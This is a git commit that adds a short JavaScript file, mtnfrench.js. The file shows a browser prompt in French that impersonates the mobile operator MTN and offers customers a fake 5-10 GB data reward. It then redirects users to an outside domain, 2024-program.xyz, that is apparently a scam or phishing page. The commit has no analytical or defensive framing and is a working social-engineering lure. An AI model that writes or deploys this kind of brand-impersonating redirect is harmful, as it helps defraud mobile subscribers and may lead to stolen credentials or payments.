fa6a154c19c6addd48b7bd0b1a7c599823b1a5c7
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-26 13:14:20 -0700

    Create mtnfrench.js

---
+++ mtnfrench.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('MTN : Cher client, veuillez vérifier si votre carte SIM est éligible à notre récompense MTN 5 Go - 10 Go pour les anciens clients, appuyez sur 1 pour vérifier maintenant ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/mtn-french.html';
+}
